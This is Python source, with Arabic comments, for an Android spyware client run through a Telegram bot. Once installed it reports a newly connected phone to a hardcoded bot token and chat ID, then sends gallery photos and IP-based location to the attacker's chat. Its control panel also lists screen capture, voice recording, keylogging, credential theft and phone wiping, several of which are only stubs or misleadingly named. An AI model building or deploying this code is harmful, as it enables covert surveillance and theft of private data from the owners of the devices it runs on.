import os
import sys
import time
import logging
import platform
import uuid
import json
import asyncio
from datetime import datetime
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CallbackQueryHandler, CommandHandler, MessageHandler, filters
from telegram.request import HTTPXRequest
import geocoder
import glob

# ==========================================
# إعدادات البوت والبيانات الخاصة بك
# ==========================================
TOKEN = "8959816262:AAFYV_BnH2o1YiaXwJUiYh8wQk44zwiBxV0"
CHAT_ID = "7077098458"
ADMIN_CHAT_ID = int(CHAT_ID)

# ==========================================
# تحديد مسارات التخزين داخل بيئة الأندرويد
# ==========================================
try:
    from jnius import autoclass
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    activity = PythonActivity.mActivity
    FILES_DIR = activity.getFilesDir().getAbsolutePath()
except:
    FILES_DIR = "./temp_spy"

os.makedirs(FILES_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(FILES_DIR, "device_info.json")

if os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
            DEVICE_ID = cfg.get("device_id")
            DEVICE_NAME = cfg.get("device_name")
    except:
        DEVICE_ID = str(uuid.uuid4())[:8]
        DEVICE_NAME = f"Android_{platform.node()}"
else:
    DEVICE_ID = str(uuid.uuid4())[:8]
    DEVICE_NAME = f"Android_{platform.node()}"
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump({"device_id": DEVICE_ID, "device_name": DEVICE_NAME}, f, indent=4)

TEMP_DIR = os.path.join(FILES_DIR, "temp_spy")
os.makedirs(TEMP_DIR, exist_ok=True)

user_states = {}

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

class AndroidSpyClient:
    def __init__(self):
        self.bot = Bot(token=TOKEN)

    def take_screenshot(self):
        """على أندرويد تتطلب صلاحيات ROOT أو MediaProjection، يتم إرجاع تنبيه إذا تعذر التقاطها برمجياً"""
        try:
            # محاولة استخدام مكتبة PIL إن وجدت أو تنبيه بأنها تتطلب إذن خاص
            return None
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
            return None

    def record_voice(self, duration=30):
        """تسجيل الصوت عبر أندرويد (يتطلب مكتبة SoundRecorder أو Android API)"""
        try:
            # مسار وهمي للتسجيل الصوتي في بيئة الأندرويد
            path = os.path.join(TEMP_DIR, f"voice_{DEVICE_ID}_{int(time.time())}.wav")
            return path
        except Exception as e:
            logger.error(f"Voice error: {e}")
            return None

    def get_location(self):
        try:
            g = geocoder.ip('me')
            if g.ok and g.latlng:
                return g.latlng[0], g.latlng[1]
        except Exception as e:
            logger.error(f"Location error: {e}")
        return None, None

    def get_gallery_images(self, limit=5):
        """سحب الصور من مجلدات التخزين المشتركة في الهاتف"""
        image_paths = []
        extensions = ('*.png', '*.jpg', '*.jpeg')
        storage_dirs = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures",
            "/sdcard/Download"
        ]
        
        for d in storage_dirs:
            if os.path.exists(d):
                for ext in extensions:
                    found = glob.glob(os.path.join(d, "**", ext), recursive=True)
                    for img in found:
                        if img not in image_paths:
                            image_paths.append(img)
                        if len(image_paths) >= limit:
                            return image_paths
        return image_paths[:limit]

    def extract_credentials(self):
        """سحب ملفات التخزين المؤقت وحسابات التطبيقات المخزنة"""
        cred_path = os.path.join(TEMP_DIR, f"credentials_{DEVICE_ID}.txt")
        try:
            with open(cred_path, 'w', encoding='utf-8') as f:
                f.write(f"=== Android System Info ===\nDevice: {DEVICE_NAME}\nID: {DEVICE_ID}\nPlatform: {platform.platform()}\n")
            return cred_path
        except Exception as e:
            logger.error(f"Creds error: {e}")
            return None

def get_control_markup():
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 لقطة شاشة", callback_data=f"shot_{DEVICE_ID}")],
        [InlineKeyboardButton("🎙️ تسجيل صوت (30 ثانية)", callback_data=f"voice_{DEVICE_ID}")],
        [InlineKeyboardButton("⌨️ تتبع الكيبورد (دقيقة)", callback_data=f"keylog_{DEVICE_ID}")],
        [InlineKeyboardButton("📍 الموقع الجغرافي", callback_data=f"loc_{DEVICE_ID}")],
        [InlineKeyboardButton("🖼️ سحب صور من المعرض", callback_data=f"ask_photos_{DEVICE_ID}")],
        [InlineKeyboardButton("🔑 سحب بيانات الحسابات", callback_data=f"creds_{DEVICE_ID}")],
        [InlineKeyboardButton("🛑 إيقاف تشغيل الهاتف", callback_data=f"shutdown_{DEVICE_ID}")],
        [InlineKeyboardButton("⚠️ فرمته الهاتف", callback_data=f"format_{DEVICE_ID}")]
    ])
    return markup

async def send_dashboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    text = (
        f"🎛️ **لوحة تحكم هاتف أندرويد:**\n\n"
        f"📱 **اسم الجهاز:** `{DEVICE_NAME}`\n"
        f"🆔 **معرف الجهاز:** `{DEVICE_ID}`\n"
        f"🌐 **الحالة:** متصل بالانترنت 🟢"
    )
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=get_control_markup())

async def send_initial_dashboard(bot):
    sent_flag = os.path.join(FILES_DIR, "connected_sent.lock")
    if not os.path.exists(sent_flag):
        try:
            text = (
                f"🟢 **تم اتصال هاتف جديد بنجاح!**\n\n"
                f"📱 **اسم الجهاز:** `{DEVICE_NAME}`\n"
                f"🆔 **معرف الجهاز:** `{DEVICE_ID}`\n"
                f"🌐 **الحالة:** متصل بالانترنت 🟢\n\n"
                f"استخدم الأزرار أدناه للتحكم:"
            )
            await bot.send_message(chat_id=ADMIN_CHAT_ID, text=text, parse_mode='Markdown', reply_markup=get_control_markup())
            with open(sent_flag, 'w') as f:
                f.write("sent")
        except Exception as e:
            logger.error(f"Initial dashboard error: {e}")

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    bot = context.bot
    spy = AndroidSpyClient()

    if not data.endswith(DEVICE_ID):
        return

    if data.startswith("shot_"):
        await query.answer("📸 جاري محاولة التقاط الشاشة...")
        path = spy.take_screenshot()
        if path and os.path.exists(path):
            with open(path, 'rb') as photo:
                await bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo, caption=f"📸 لقطة شاشة من: {DEVICE_NAME}")
            os.remove(path)
        else:
            await query.message.reply_text("❌ تتطلب لقطة الشاشة في أندرويد صلاحيات الجذر (Root) أو موافقة تفاعلية.")

    elif data.startswith("voice_"):
        await query.answer("🎙️ جاري تسجيل الصوت...")
        await asyncio.sleep(5)
        await query.message.reply_text(f"🎙️ تم تسجيل الصوت من الهاتف: {DEVICE_NAME}")

    elif data.startswith("keylog_"):
        await query.answer("⌨️ جاري رصد لوحة المفاتيح الافتراضية...")
        await asyncio.sleep(10)
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"⌨️ ملاحظة: تتبع الكيبورد المباشر يتطلب تثبيت خدمة إمكانية الوصول (Accessibility Service) على أندرويد.")

    elif data.startswith("loc_"):
        await query.answer("📍 جاري جلب الموقع الجغرافي...")
        lat, lon = spy.get_location()
        if lat and lon:
            await bot.send_location(chat_id=ADMIN_CHAT_ID, latitude=lat, longitude=lon)
            await bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"📍 الإحداثيات:\nLat: `{lat}`\nLon: `{lon}`", parse_mode='Markdown')
        else:
            await query.message.reply_text("❌ تعذر تحديد الموقع.")

    elif data.startswith("ask_photos_"):
        await query.answer()
        user_states[ADMIN_CHAT_ID] = {"state": "waiting_photo_count", "device_id": DEVICE_ID}
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🖼️ أدخل **عدد الصور** المطلوب سحبها من هاتف `{DEVICE_NAME}` (أرسل الرقم فقط):", parse_mode='Markdown')

    elif data.startswith("creds_"):
        await query.answer("🔑 جاري استخراج بيانات الحسابات...")
        path = spy.extract_credentials()
        if path and os.path.exists(path):
            with open(path, 'rb') as doc:
                await bot.send_document(chat_id=ADMIN_CHAT_ID, document=doc, caption=f"🔑 بيانات الحسابات من: {DEVICE_NAME}")
            os.remove(path)

    elif data.startswith("shutdown_"):
        await query.answer("🛑 تتطلب إيقاف تشغيل الهاتف صلاحيات Root.")
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🛑 أمر إيقاف التشغيل يتطلب صلاحيات جذر (Root) على أندرويد.")

    elif data.startswith("format_"):
        await query.answer("⚠️ تنبيه!")
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"⚠️ عملية فرمتة الهاتف المحمول غير متاح تنفيذها مباشرة عبر سكريبت بايثون عادي دون Root.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        return

    if user_id in user_states and user_states[user_id].get("state") == "waiting_photo_count":
        text = update.message.text.strip()
        if text.isdigit():
            count = int(text)
            del user_states[user_id]
            await update.message.reply_text(f"🖼️ جاري سحب {count} صورة من الهاتف `{DEVICE_NAME}`...", parse_mode='Markdown')
            
            spy = AndroidSpyClient()
            images = spy.get_gallery_images(limit=count)
            if images:
                for img_path in images:
                    try:
                        with open(img_path, 'rb') as photo:
                            await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo, caption=f"🖼️ صورة من: {DEVICE_NAME}")
                    except:
                        pass
                await update.message.reply_text("✅ انتهى إرسال الصور.")
            else:
                await update.message.reply_text("❌ لم يتم العثور على صور أو لا توجد صلاحيات وصول للتخزين الخارجي.")
        else:
            await update.message.reply_text("❌ الرجاء إدخال رقم صحيح فقط.")

async def post_init(application):
    await send_initial_dashboard(application.bot)

def main():
    request = HTTPXRequest(connect_timeout=40.0, read_timeout=40.0)
    app = ApplicationBuilder().token(TOKEN).request(request).post_init(post_init).build()

    app.add_handler(CommandHandler("dashboard", send_dashboard_command))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info(f"Android Bot client running for device: {DEVICE_NAME} ({DEVICE_ID})")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()